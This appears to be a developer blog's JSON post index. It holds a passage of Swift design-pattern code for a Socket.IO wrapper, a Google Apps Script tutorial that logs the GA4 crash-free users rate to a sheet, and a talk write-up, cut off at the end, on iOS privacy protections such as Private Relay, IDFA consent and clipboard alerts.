id: UUID {get} init(url: URL) func connect() func reconnect() func disconnect() func sendEvent(_ event: String) func onEvent(_ event: String) -&gt; AnyPublisher&lt;Data?, Never&gt;}// Socket.IO Implementationclass SIOConnection: Connection { let connectionState: ConnectionState = .created let url: URL let id: UUID = UUID() required init(url: URL) { self.url = url // } func connect() { // } func disconnect() { // } func reconnect() { // } func sendEvent(_ event: String) { // } func onEvent(_ event: String) -&gt; AnyPublisher&lt;Data?, Never&gt; { // return PassthroughSubject&lt;Data?, Never&gt;().eraseToAnyPublisher() }}//struct ConnectionKeeperHandlerContext { let connection: Connection let isOccupie: Bool}protocol ConnectionKeeperHandler { var nextHandler: ConnectionKeeperHandler? { get set } func handle(context: ConnectionKeeperHandlerContext) func execute(context: ConnectionKeeperHandlerContext) func canExcute(context: ConnectionKeeperHandlerContext) -&gt; Bool}extension ConnectionKeeperHandler { func handle(context: ConnectionKeeperHandlerContext) { if canExcute(context: context) { execute(context: context) } else { nextHandler?.handle(context: context) } }}class DisconnectedConnectionKeeperHandler: ConnectionKeeperHandler { var nextHandler: ConnectionKeeperHandler? func execute(context: ConnectionKeeperHandlerContext) { context.connection.disconnect() } func canExcute(context: ConnectionKeeperHandlerContext) -&gt; Bool { if context.connection.connectionState == .connected &amp;&amp; !context.isOccupie { return true } return false }}class ReconnectConnectionKeeperHandler: ConnectionKeeperHandler { var nextHandler: ConnectionKeeperHandler? func execute(context: ConnectionKeeperHandlerContext) { context.connection.reconnect() } func canExcute(context: ConnectionKeeperHandlerContext) -&gt; Bool { if context.connection.connectionState == .disconnected &amp;&amp; context.isOccupie { return true } return false }}class ReleasedConnectionKeeperHandler: ConnectionKeeperHandler { var nextHandler: ConnectionKeeperHandler? func execute(context: ConnectionKeeperHandlerContext) { context.connection.disconnect() } func canExcute(context: ConnectionKeeperHandlerContext) -&gt; Bool { if context.connection.connectionState == .disconnected &amp;&amp; !context.isOccupie { return true } return false }}let connection = SIOConnection(url: URL(string: \"wss://pinkoi.com\")!)let disconnectedHandler = DisconnectedConnectionKeeperHandler()let reconnectHandler = ReconnectConnectionKeeperHandler()let releasedHandler = ReleasedConnectionKeeperHandler()disconnectedHandler.nextHandler = reconnectHandlerreconnectHandler.nextHandler = releasedHandlerdisconnectedHandler.handle(context: ConnectionKeeperHandlerContext(connection: connection, isOccupie: false))Requirement Scenario 4.What?The Connection we encapsulate needs to be set up before use, such as providing the URL Path, configuring settings, and so on.Why? Flexible addition and removal of construction openings Reusable Construction Logic Without encapsulation, external code may operate the class in unintended ways. e.g.: ‚ùålet connection = Connection()connection.send(event) // unexpected method call, should call .connect() first‚úÖlet connection = Connection()connection.connect()connection.send(event)// but...who knows???How? Builder Pattern: A creational pattern that enables step-by-step object construction and reuse of building methods. Builder Pattern: SIOConnectionBuilder is the builder for Connection, responsible for setting and storing data used during the construction of a Connection; the ConnectionConfiguration abstract interface ensures that .connect() must be called before obtaining a Connection instance.enum ConnectionState { case created case connected case disconnected case reconnecting case released}protocol Connection { var connectionState: ConnectionState {get} var url: URL {get} var id: UUID {get} init(url: URL) func connect() func reconnect() func disconnect() func sendEvent(_ event: String) func onEvent(_ event: String) -&gt; AnyPublisher&lt;Data?, Never&gt;}// Socket.IO Implementationclass SIOConnection: Connection { let connectionState: ConnectionState = .created let url: URL let id: UUID = UUID() required init(url: URL) { self.url = url // } func connect() { // } func disconnect() { // } func reconnect() { // } func sendEvent(_ event: String) { // } func onEvent(_ event: String) -&gt; AnyPublisher&lt;Data?, Never&gt; { // return PassthroughSubject&lt;Data?, Never&gt;().eraseToAnyPublisher() }}//class SIOConnectionClient: ConnectionConfiguration { private let url: URL private let config: [String: Any] init(url: URL, config: [String: Any]) { self.url = url self.config = config } func connect() -&gt; Connection { // set config return SIOConnection(url: url) }}protocol ConnectionConfiguration { func connect() -&gt; Connection}class SIOConnectionBuilder { private(set) var config: [String: Any] = [:] func setConfig(_ config: [String: Any]) -&gt; SIOConnectionBuilder { self.config = config return self } // url is required parameter func build(url: URL) -&gt; ConnectionConfiguration { return SIOConnectionClient(url: url, config: self.config) }}let builder = SIOConnectionBuilder().setConfig([\"test\":123])let connection1 = builder.build(url: URL(string: \"wss://pinkoi.com/1\")!).connect()let connection2 = builder.build(url: URL(string: \"wss://pinkoi.com/1\")!).connect()Extension: Here, you can also apply the Factory Pattern to generate SIOConnection using a factory.Done!These are the four scenarios encountered during the Socket.IO encapsulation and the seven Design Patterns used to solve the problems.Finally, the complete design blueprint for this Socket.IO encapsulation is attachedThe naming and examples differ slightly from the text; this diagram shows the actual design architecture. We hope the original designer can share the design concept and open source it in the future.Who?Who designed these and was responsible for the Socket.IO packaging project?Sean Zheng , Android Engineer @ PinkoiMain architect, design pattern evaluation and application, implemented design on Android using Kotlin.ZhgChgLi , Engineer Lead/iOS Engineer @ PinkoiPlatform Team project leader, pair programming, implementing designs in Swift on iOS, discussing and raising questions (a.k.a. just talking), and finally writing this article to share with everyone.Further Reading Practical Application of Design Patterns (Encapsulating WKWebView) Visitor Pattern in Swift (Share Object to XXX Example) Visitor Pattern in TableView For any questions or feedback, feel free to contact me . üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Crashlytics & Google AnalyticsÔΩúAutomate Crash-Free User Rate Queries with Google Apps Script", "url": "/posts/zrealm-dev/crashlytics-google-analytics-automate-crash-free-user-rate-queries-with-google-apps-script-793cb8f89b72/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, crashlytics, ios-app-development, google-analytics, google-apps-script, google-sheets", "date": "2021-11-21 22:47:10 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Crashlytics + Google Analytics Automated Query for App Crash-Free Users RateUs...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Crashlytics + Google Analytics Automated Query for App Crash-Free Users RateUsing Google Apps Script to Query Crashlytics via Google Analytics and Auto-fill into Google Sheet In the previous article ‚ÄúCrashlytics + Big Query: Building a More Real-Time and Convenient Crash Tracking Tool,‚Äù we exported raw crash data from Crashlytics to Big Query and used Google Apps Script to schedule queries for the Top 10 crashes and send notifications to a Slack channel.This article continues from automating an important metric related to app crashes ‚Äî Crash-Free Users Rate, the percentage of unaffected users. Many app teams continuously track and record this data. Traditionally, this was done manually. The goal here is to automate this repetitive task and avoid errors caused by manual data entry. As mentioned before, Firebase Crashlytics does not provide any API for querying data, so we need to connect Firebase data to other Google services and then use those services‚Äô APIs to retrieve the relevant data.At first, I thought this data could also be queried from Big Query; however, this approach was completely wrong because Big Query contains only raw crash data and does not include data for users without crashes. Therefore, it cannot calculate the Crash-Free Users Rate. There is little information about this requirement online, and after a long search, I found someone mentioning the keyword Google Analytics. I knew Firebase Analytics and Events could be linked to GA for queries, but I didn‚Äôt expect the Crash-Free Users Rate data to be included as well. After reviewing the GA API, Bingo!API Dimensions &amp; MetricsGoogle Analytics Data API (GA4) offers two metrics: crashAffectedUsers: Number of users affected by crashes crashFreeUsersRate: Percentage of users not affected by crashes (expressed as a decimal) Once you understand the routing, you can start implementing it!Integrate Firebase -&gt; Google AnalyticsRefer to the official instructions for setup steps; omitted here for brevity.GA4 Query Explorer ToolBefore writing code, we can first use the official Web GUI Tool to quickly build query conditions and obtain query results; after confirming the results are what we want, we can then start coding.Go to &gt;&gt;&gt; GA4 Query Explorer Remember to select GA4 in the top left corner. After logging in on the right, select the corresponding GA Account &amp; Property. Start Date, End Date: You can directly enter the date or use special variables to represent the date (ysterday, today, 30daysAgo, 7daysAgo) metrics: Add crashFreeUsersRate dimensions: Add platform (device type iOS/Android/Desktop‚Ä¶) dimension filter: add platform, string, exact, iOS or AndroidQuery the Crash Free Users Rate separately for both platforms.Scroll to the bottom and click ‚ÄúMake Request‚Äù to see the results. We can then get the Crash-Free Users Rate for the specified date range. You can go back and open Firebase Crashlytics to compare if the data under the same conditions is identical. There is a slight difference between the two numbers (one value differs by 0.0002), cause unknown, but within an acceptable margin of error; if we consistently use the GA Crash-Free Users Rate, it wouldn‚Äôt be considered an error.Use Google Apps Script to Automatically Fill Data into Google SheetsNext is the automation part. We will use Google Apps Script to query the GA Crash-Free Users Rate data and automatically fill it into our Google Sheet; achieving the goal of automatic entry and tracking.Assuming our Google Sheet is as shown in the above image.You can click Extensions -&gt; Apps Script at the top of Google Sheets to create a Google Apps Script, or go to Google Apps Script -&gt; click New Project at the top left.After entering, you can first click the untitled project name at the top and give the project a name.In the left menu under ‚ÄúServices,‚Äù click the ‚Äú+‚Äù to add ‚ÄúGoogle Analytics Data API.‚ÄùBack to the GA4 Query Explorer tool, you can check ‚ÄúShow Request JSON‚Äù next to the Make Request button to get the Request JSON for this condition.The converted Request JSON to Google Apps Script is as follows:// Remember to add Google Analytics Data API to Services, or you'll see this error: ReferenceError: AnalyticsData is not defined// https://ga-dev-tools.web.app/ga4/query-explorer/ -&gt; property idconst propertyId = \"\";// https://docs.google.com/spreadsheets/d/googleSheetID/const googleSheetID = \"\";// Google Sheet nameconst googleSheetName = \"App Crash-Free Users Rate\";function execute() { Logger.log(fetchCrashFreeUsersRate())}function fetchCrashFreeUsersRate(platform = \"iOS\", startDate = \"30daysAgo\", endDate = \"today\") { const dimensionPlatform = AnalyticsData.newDimension(); dimensionPlatform.name = \"platform\"; const metric = AnalyticsData.newMetric(); metric.name = \"crashFreeUsersRate\"; const dateRange = AnalyticsData.newDateRange(); dateRange.startDate = startDate; dateRange.endDate = endDate; const filterExpression = AnalyticsData.newFilterExpression(); const filter = AnalyticsData.newFilter(); filter.fieldName = \"platform\"; const stringFilter = AnalyticsData.newStringFilter() stringFilter.value = platform; stringFilter.matchType = \"EXACT\"; filter.stringFilter = stringFilter; filterExpression.filter = filter; const request = AnalyticsData.newRunReportRequest(); request.dimensions = [dimensionPlatform]; request.metrics = [metric]; request.dateRanges = dateRange; request.dimensionFilter = filterExpression; const report = AnalyticsData.Properties.runReport(request, \"properties/\" + propertyId); return parseFloat(report.rows[0].metricValues[0].value) * 100;} GA Property ID: You can also get it from the GA4 Query Explorer tool mentioned earlier:In the initial Property selection menu, the number below the chosen Property is the propertyId. googleSheetID: Can be obtained from the Google Sheet URL https://docs.google.com/spreadsheets/d/ googleSheetID /edit googleSheetName: The name of the sheet in Google Sheets that records crash logs Paste the above code into the right code editor in Google Apps Script, then select the ‚Äúexecute‚Äù function from the method dropdown above. You can click Debug to test if the data can be retrieved correctly:The first time you run it, an authorization prompt will appear:Complete the account authorization by following the steps.If the execution is successful, the Crash-Free Users Rate will be printed in the log below, indicating a successful query.Next, we just need to add automatic input into Google Sheets, and we‚Äôre all set!Complete Code:// Remember to add Google Analytics Data API to Services, or you'll see this error: ReferenceError: AnalyticsData is not defined// https://ga-dev-tools.web.app/ga4/query-explorer/ -&gt; property idconst propertyId = \"\";// https://docs.google.com/spreadsheets/d/googleSheetID/const googleSheetID = \"\";// Google Sheet nameconst googleSheetName = \"\";function execute() { const today = new Date(); const daysAgo7 = new Date(new Date().setDate(today.getDate() - 6)); // Today not included, so -6 const spreadsheet = SpreadsheetApp.openById(googleSheetID); const sheet = spreadsheet.getSheetByName(googleSheetName); var rows = []; rows[0] = Utilities.formatDate(daysAgo7, \"GMT+8\", \"MM/dd\")+\"~\"+Utilities.formatDate(today, \"GMT+8\", \"MM/dd\"); rows[1] = fetchCrashFreeUsersRate(\"iOS\", Utilities.formatDate(daysAgo7, \"GMT+8\", \"yyyy-MM-dd\"), Utilities.formatDate(today, \"GMT+8\", \"yyyy-MM-dd\")); rows[2] = fetchCrashFreeUsersRate(\"android\", Utilities.formatDate(daysAgo7, \"GMT+8\", \"yyyy-MM-dd\"), Utilities.formatDate(today, \"GMT+8\", \"yyyy-MM-dd\")); sheet.appendRow(rows);}function fetchCrashFreeUsersRate(platform = \"iOS\", startDate = \"30daysAgo\", endDate = \"today\") { const dimensionPlatform = AnalyticsData.newDimension(); dimensionPlatform.name = \"platform\"; const metric = AnalyticsData.newMetric(); metric.name = \"crashFreeUsersRate\"; const dateRange = AnalyticsData.newDateRange(); dateRange.startDate = startDate; dateRange.endDate = endDate; const filterExpression = AnalyticsData.newFilterExpression(); const filter = AnalyticsData.newFilter(); filter.fieldName = \"platform\"; const stringFilter = AnalyticsData.newStringFilter() stringFilter.value = platform; stringFilter.matchType = \"EXACT\"; filter.stringFilter = stringFilter; filterExpression.filter = filter; const request = AnalyticsData.newRunReportRequest(); request.dimensions = [dimensionPlatform]; request.metrics = [metric]; request.dateRanges = dateRange; request.dimensionFilter = filterExpression; const report = AnalyticsData.Properties.runReport(request, \"properties/\" + propertyId); return parseFloat(report.rows[0].metricValues[0].value) * 100;}Click ‚ÄúRun or Debug‚Äù above again to execute.Back to Google Sheet, data added successfully!Add Trigger for Scheduled Automation ExecutionSelect the clock button on the left -&gt; ‚Äú+ Add Trigger‚Äù at the bottom right. The first function selects ‚Äúexecute‚Äù The time-based trigger allows selecting a weekly timer to track and add data once every week After setting, just click Save.CompletedStarting now, fully automate the tracking of App Crash-Free Users Rate data; no manual queries or entries needed; let the machine handle everything automatically! We only need to focus on solving the App Crash issue! p.s. Unlike the previous article using Big Query which requires payment for data queries, this article‚Äôs queries on Crash-Free Users Rate and Google Apps Script are completely free to use.If you want to send the results to a Slack Channel simultaneously, refer to the previous article:Further Reading Ultimate Beginner‚Äôs Guide to Google Analytics 4 (NEW 2023 Interface) (Thanks to Emma for providing the information) Crashlytics + Big Query Build a More Real-Time and Convenient Crash Tracking Tool Automate Routine Tasks Using Python + Google Cloud Platform + Line Bot Slack Builds Fully Automated WFH Employee Health Reporting System Using Google Apps Script to Forward Gmail Emails to Slack If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "iOS Privacy EvolutionÔΩúApple's Principles and Feature Enhancements", "url": "/posts/zrealm-dev/ios-privacy-evolution-apple-s-principles-and-feature-enhancements-9a05f632eba0/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios-app-development, privacy, private-relay, apple-privacy, mopcon", "date": "2021-10-24 09:15:55 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!The Past and Present of iOS Privacy and ConvenienceApple Privacy Principles an...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!The Past and Present of iOS Privacy and ConvenienceApple Privacy Principles and iOS Privacy Protection Features Over the YearsTheme by slidego[2023‚Äì08‚Äì01] iOS 17 UpdateAdditional notes on the latest iOS 17 privacy updates from the previous presentation.Link Tracking ProtectionSafari automatically removes tracking parameters from URLs (e.g., fbclid, gclid, etc.) Example: https://zhgchg.li/post/1?gclid=124 will become https://zhgchg.li/post/1 after clicking. Currently testing iOS 17 Developer Beta 4, fbxxx, gcxxx, etc. are removed, while utm_ parameters remain; it is unclear if the official iOS 17 or future iOS 18 will improve this further. To see the effect under the strictest conditions, you can install the iOS DuckDuckGo browser for testing. For detailed test information, please refer to the excellent article ‚ÄúiOS17 Safari‚Äôs new feature removes fbclid and gclid from URLs.‚Äù Privacy Manifest .xprivacy &amp; ReportDevelopers must declare the User Privacy used, and also require the SDKs used to provide their Privacy Manifest.Also added third-party SDK SignatureXCode 15 can generate a Privacy Report through the Manifest for developers to set app privacy on the App Store.Required reason APITo prevent potential misuse of Foundation APIs that could lead to fingerprinting, Apple has started to regulate certain Foundation APIs; you need to declare the purpose of use in the Manifest.Currently, the more impactful one is UserDefault, which is an API that requires declaration.Starting from Fall 2023, if your new app or app update uploaded to App Store Connect uses APIs that require a declared purpose (including those from third-party SDKs), and you have not provided an approved purpose in the app's privacy manifest, you will receive a notification. From Spring 2024, to upload a new app or app update to App Store Connect, you must specify the approved purpose in the app's privacy manifest to accurately reflect how your app uses the relevant APIs.If the current approved purposes do not cover a use case for an API that requires a declared purpose, and you believe this use case directly benefits your app users, please let us know.Tracking DomainThe API domain for sending tracking information must be declared in the privacy manifest .xprivacy and network requests can only be initiated after the user consents to tracking. Otherwise, all network requests to this domain will be blocked by the system.You can check if the Tracking Domain is blocked using the XCode Network tool:Currently, Facebook and Google‚Äôs tracking domains are detected and must be listed as tracking domains according to regulations and permissions must be requested. graph.facebook.com : Facebook-related data statistics app-measurement.com : Google-related data statistics: GA/Firebase‚Ä¶. Please note that FB/Google data statistics may significantly decline after iOS 17 because without permission requests and tracking consent, no data will be collected; based on past implementations of tracking permission requests, about 70% of users choose not to allow tracking. Developers‚Äô own API calls for sending tracking also need to comply with the tracking domain regulations mentioned above by Apple. If the Tracking Domain and API Domain are the same, a separate Tracking Domain must be created (e.g. api.zhgchg.li -&gt; tracking.zhgchg.li) Currently, it is unclear how Apple manages developers‚Äô own tracking. Testing our own with XCode 15 has not been detected. It is unclear whether the officials will use tools to detect behavior or rely on manual review by staff. fingerprinting is still prohibited.IntroductionI am honored to participate in the MOPCON Talk, but due to the pandemic, it was held online, which is unfortunate as I couldn‚Äôt meet more new friends. The topic of this talk is ‚ÄúThe Past and Present of iOS Privacy and Convenience,‚Äù where I mainly want to share Apple‚Äôs privacy principles and the adjustments in iOS features over the years based on these privacy principles.iOS Privacy and Convenience: Past and Present | Pinkoi, We Are Hiring!I believe developers and iPhone users have become quite familiar with the following feature adjustments over the past few years: iOS ‚â• 13: All apps supporting third-party login must implement Sign in with Apple, or they cannot be successfully published on the App Store. iOS ‚â• 14: Clipboard Access Alert iOS ‚â• 14.5: IDFA must be allowed before access, effectively blocking IDFA. iOS ‚â• 15: Private Relay uses a proxy to hide the user‚Äôs original IP address iOS ‚â• 16: Clipboard access requires user permission ‚Ä¶.and many more, which I will share with everyone at the end of the article Why?If you don‚Äôt understand Apple‚Äôs privacy principles, you might wonder why Apple has been constantly clashing with developers and advertisers in recent years. Many features that users are accustomed to have been blocked.After watching ‚ÄúWWDC 2021 ‚Äî Apple‚Äôs privacy pillars in focus‚Äù and reading ‚ÄúApple privacy white paper ‚Äî A Day in the Life of Your Data,‚Äù I was awakened to the fact that we have unknowingly leaked a lot of personal privacy. Advertisers and social media platforms have profited greatly, reaching an all-pervasive level in our daily lives.Referencing Apple privacy white paper, the following example uses a fictional character, Harry, to explain how privacy can be leaked and the potential harms it may cause.First is Harry‚Äôs usage record on the iPhone.On the left is the web browsing history: You can see visits to websites related to cars, iPhone 13, and luxury goods.On the right are the installed apps: Investment, travel, social, shopping, and even a baby monitor‚Ä¶ these appsHarry‚Äôs Offline LifePlaces where offline activities leave records, such as: receipts, credit card transaction records, dashcam footage, etc.CombinationYou might wonder how browsing different websites, using various apps (even without logging in), and attending offline events could possibly allow a service to connect all the data together.The answer is: There are technical means, and it is ‚Äúpossible‚Äù or has ‚Äúalready‚Äù occurred partially.As shown in the above image: When not logged in, websites can identify the same visitor across different sites using Third-Party Cookies or fingerprints calculated from IP address + device information. When logging in, websites can link your data across sites using registration details such as name, birthday, phone number, email, and ID number. Apps can identify the same user across different apps by obtaining the device UUID, detecting other installed apps on the phone via URL Scheme, and transferring data between apps through the Pasteboard. Additionally, user registration data can link information after login. Data can also be transferred between apps and websites using Third-Party Cookies, fingerprinting, and Pasteboard. The connection between online and offline activities may occur when banks collect credit card transaction records, expense tracking apps, receipt collection apps, dashcam apps, and more. These can link offline activities with online data. It has been proven technically feasible; so who exactly are the third parties behind all websites and apps?Large companies like Facebook and Google earn significant revenue from personal advertising; many websites and apps also integrate Facebook and Google SDKs‚Ä¶ so it‚Äôs hard to say for sure. While some are visible, more often we don‚Äôt know which third-party advertising or data collection services websites and apps use, secretly tracking our every move behind the scenes.Assuming all of Harry‚Äôs activities are secretly tracked by the same third party collecting his data, Harry‚Äôs possible profile might look like this:The left side shows personal information, possibly from website registration or delivery data; the right side displays behavior and interest tags based on Harry‚Äôs activity records.In its eyes, Harry might understand himself even better than Harry does; this data, when used on social media, can make users more addicted; when used in advertising, it can trigger Harry‚Äôs overspending or create a cage effect (e.g., recommending you buy new pants, then you buy shoes to match the pants, then socks to go with the shoes‚Ä¶ endlessly).If you think the above is scary enough, there is something even scarier:Having your personal information and knowing your financial status‚Ä¶ if used for malicious purposes, it‚Äôs unimaginable, such as kidnapping or theft‚Ä¶Current Privacy Protection Methods Legal Regulations (EX: SGS-BS10012 Personal Data Verification, CCPA, GDPR‚Ä¶) Privacy Policy and De-identification The main approach is still through regulatory constraints; it‚Äôs hard to ensure services 100% always comply, and with many malicious programs online, it‚Äôs also difficult to guarantee services won‚Äôt be hacked causing data leaks. In short, ‚Äúif someone wants to do something bad, it‚Äôs technically feasible; relying solely on regulations and corporate conscience is not enough.‚ÄùBesides, most of the time, we are ‚Äúforced‚Äù to accept privacy policies. We cannot authorize privacy settings individually; either we don‚Äôt use the entire service or we use it but must accept all privacy terms. Privacy policies are often opaque, leaving us unaware of how data is collected and used, and whether a third party is secretly gathering our information without our knowledge.Apple also mentioned that minors‚Äô personal privacy is often collected by services without the consent of their guardians.Apple‚Äôs privacy principlesAfter understanding the dangers of personal privacy leaks, let‚Äôs take a look at Apple‚Äôs privacy principles.Excerpt from Apple Privacy White Paper: Apple‚Äôs ideal is not to completely block but to balance. For example, many people have installed AD Blockers in recent years to fully block ads, which is not what Apple wants; because if connections are completely cut off, it becomes difficult to provide better services.Jobs said at the 2010 All Things Digital Conference: I believe people are smart; some are more willing to share data than others. Keep asking them until they get annoyed and tell you to stop. This way, they clearly understand how you intend to use their data. ‚Äî translate by Chun-Hsiu Liu Apple believes privacy is a fundamental human rightApple‚Äôs Four Privacy Principles: Data Minimization: Only collect the data you need On-Device Processing: Apple uses powerful processor chips, and privacy-related data should be processed locally whenever possible. User Transparency and Control: Inform users about what privacy information is collected and how it is used. Also, allow users to control sharing settings for individual privacy data. Security: Ensure the safety of data storage and transmission iOS Privacy-Focused Feature Adjustments Over the YearsAfter understanding the risks of personal privacy leaks and Apple‚Äôs privacy principles, let‚Äôs return to the technical side; we can look at the changes iOS has made over the years to protect personal privacy.Between WebsitesMentioned earlierThe first method uses Third-Party Cookies to link visitor data across websites: üà≤, Safari on iOS &gt;= 11 has implemented Intelligent Tracking Prevention ( WebKit )Enabled by default, the browser actively identifies and blocks third-party cookies used for tracking and advertising; each year, the iOS version continuously improves the detection system to prevent misses.The method of tracking users across websites via Third-Party Cookies is basically no longer feasible on Safari.The second method is to use the Fingerprint calculated from the IP Address + device information to identify the same browser across different websites: üà≤, iOS &gt;= 15 Private RelayEspecially after Third-Party Cookies were banned, more services have adopted this method. Apple is aware of this‚Ä¶ Fortunately, in iOS 15, even IP information is obfuscated!The Private Relay service first sends the user‚Äôs original request randomly to Apple‚Äôs Ingress Proxy, then Apple randomly assigns it to a partner CDN‚Äôs Egress Proxy, which finally requests the target website.The entire process is encrypted and can only be decrypted by your iPhone‚Äôs chip. Only you know both the IP and the target website of the request. Apple‚Äôs Ingress Proxy only knows your IP, the CDN‚Äôs Egress Proxy only knows Apple‚Äôs Ingress Proxy IP and the target website, and the website only knows the CDN‚Äôs Egress Proxy IP.From an application perspective, all devices in the same region use the same shared CDN Egress Proxy IP to request the target website; therefore, the website can no longer use the IP as fingerprint information.For technical details, refer to ‚ÄúWWDC 2021 ‚Äî Get ready for iCloud Private Relay‚Äù.Additional Private Relay: Apple/CDN providers do not have complete logs for tracing:I investigated how Apple prevents misuse for malicious purposes but found no clear answer; it might be similar to how Apple refuses to unlock criminals‚Äô iPhones for the FBI. Privacy is a fundamental human right for everyone. Enabled by default, no special connection needed No impact on speed or performance IP will be guaranteed within the same country and time zone (users can choose a general city), but specific IPs cannot be assigned. Only effective for partial trafficiCloud+ users: All traffic on Safari + Insecure HTTP Requests within appsRegular users: Only effective against third-party tracking tools installed on websites in Safari The official CDN Egress IP List is provided for website developers to identify (do not mistakenly block Egress IPs, as it may cause widespread issues) Network administrators can ban DNS to disable Private Relay for all users iPhone Can Disable Private Relay for Specific Network Connections Disabling Private Relay When Connecting to VPN/Using Proxy Currently still in Beta version (2021/10/24). After activation, some services may be inaccessible (China region, Chinese version of TikTok) or services may frequently log out. Private Relay Test Images Figure 1 Disabled: Original IP Address Figure 2 Enable Private Relay ‚Äî Keep general location: IP becomes CDN IP but still in Taipei Figure 3 Enabling Private Relay ‚Äî Country and Time Zone (Expanded Obfuscation): IP changes to CDN IP &amp; location shifts to Taichung, but the time zone and country remain the same Test ProjectThe app can use URLSessionTaskMetrics to analyze connection records of Private Relay.Going off-topic, therefore the method of using IP addresses to obtain fingerprints for user identification can no longer be used.Between AppsThe first method was early access to the Device UUID: üà≤ÔºåiOS &gt;= 7 prohibits access to Device UUID, Using IDentifierForAdvertisers/IDentifierForVendor Instead IDFV: All apps under the same developer account can access the same UUID; using KeyChain together is also the current method to identify user UUIDs. IDFA: Different developers and apps can obtain the same UUID, but users can reset or disable the IDFA. üà≤, iOS &gt;= 14.5 IDentifierForAdvertisers requires user consent before useAfter iOS 14.5, Apple strengthened restrictions on accessing IDFA. Apps must ask users for permission to track before obtaining the IDFA UUID; if not asked or not allowed, the value cannot be retrieved.Market research companies‚Äô preliminary data show that about 70% of users (some recent data say 90%) do not allow tracking or access to IDFA, which is why people say IDFA is dead!Test ProjectThe second method for inter-app communication is URL Scheme:iOS apps can use canOpenURL to check if a specific app is installed on the user‚Äôs device. üà≤, iOS &gt;= 9 requires in-app settings before use; cannot be detected arbitrarily. iOS ‚â• 15 new limitation: you can set up to 50 schemes for other apps only. Apps linked on or after iOS 15 are limited to a maximum of 50 entries in the LSApplicationQueriesSchemes key.Between Websites and AppsAs mentioned aboveThe first method also connects via Cookie:In early iOS, Safari cookies and App WebView cookies could be shared, allowing data to be linked between websites and apps.You can secretly insert a 1-pixel WebView component in the background of the app screen to quietly retrieve Safari cookies for use. üà≤ÔºåiOS &gt;= 11 Prohibits Cookie Sharing Between Safari and App WebViewIf you need to access Safari cookies (e.g., use website cookies for login), you can use the SFSafariViewController component; however, this component forces a prompt window and cannot be customized, ensuring users are not unknowingly having their cookies stolen.The second method is to identify the same visitor across different websites using the Fingerprint calculated from the IP Address + device information on the same website:As mentioned before, iOS ‚â• 15 is obfuscated by Private Relay.The last and only remaining method ‚Äî Pasteboard:Use the clipboard to connect cross-platform information, as Apple cannot disable clipboard use across apps, but it can notify the user. ‚ö†Ô∏è iOS &gt;= 14 Added Clipboard Access Warning‚ö†Ô∏è 2022/07/22 Update: iOS 16 Upcoming ChangesStarting from iOS 16, when an app reads the clipboard without the user actively pasting, a prompt will appear. The user must allow it for the app to access the clipboard content.UIPasteBoard‚Äôs privacy change in iOS 16Implementing Deferred Deep Link Using Pasteboard Here, I want to emphasize the privacy concerns regarding the iOS 14 clipboard. For more details, please refer to my previous article ‚ÄúiOS 14 Clipboard Privacy Panic: The Dilemma Between Privacy and Convenience‚ÄúAlthough reading the clipboard might raise concerns about data theft, more often it is our app‚Äôs way of providing a better user experience:Before implementing Deferred Deep Link, when guiding users to install the app from a website, opening the app after installation will by default only open the homepage; a better user experience should open the app to the corresponding page that matches the webpage the user was on.To achieve this function, the website and app need a way to connect data. Since other methods mentioned earlier have been blocked, the clipboard is currently the only medium for storing information (as shown above).Including Firebase Dynamic Links and the latest version of Branch.io (previously Branch.io used IP Address Fingerprint for implementation) also use the clipboard for Deferred Deep Link.Implementation can refer to my previous article: iOS Deferred Deep Link Âª∂ÈÅ≤Ê∑±Â∫¶ÈÄ£ÁµêÂØ¶‰Ωú(Swift) Generally, to achieve Deferred Deep Linking, clipboard data is read only the first time the app opens or when returning to the app; it is not accessed during use or at unusual times, which is worth noting.A better approach is to first use UIPasteboard.general.detectPatterns to detect whether the clipboard data is what we need before reading it.Test ProjectiOS ‚â• 15 has optimized clipboard notifications. If the paste action is initiated by the user, the prompt will no longer appear!Advertising Effectiveness SolutionsAs mentioned earlier about Apple‚Äôs privacy principles, the goal is balance, not completely blocking users from services.Website and Website Advertising Performance Statistics:Safari‚Äôs counterpart to blocking Intelligent Tracking Prevention is Private Click Measurement (WebKit), used to measure ad performance without compromising personal privacy.The specific process is shown in the above image. When a user clicks an ad on website A to go to website B, a Source ID (to identify the same user) and Destination information (target website) are recorded in the browser; when the user completes a conversion on website B, a Trigger ID (representing the action) is also recorded in the browser.These two pieces of information will be combined and sent to websites A and B after a random 24 to 48 hours to obtain advertising performance.Everything is handled on-device by Safari itself, and protection against malicious clicks is also provided by Safari.Ad Performance Statistics Between Apps and Websites or Apps:You can use SKAdNetwork (requires application to Apple) similar to Private Click Measurement, which will not be further elaborated here. It can 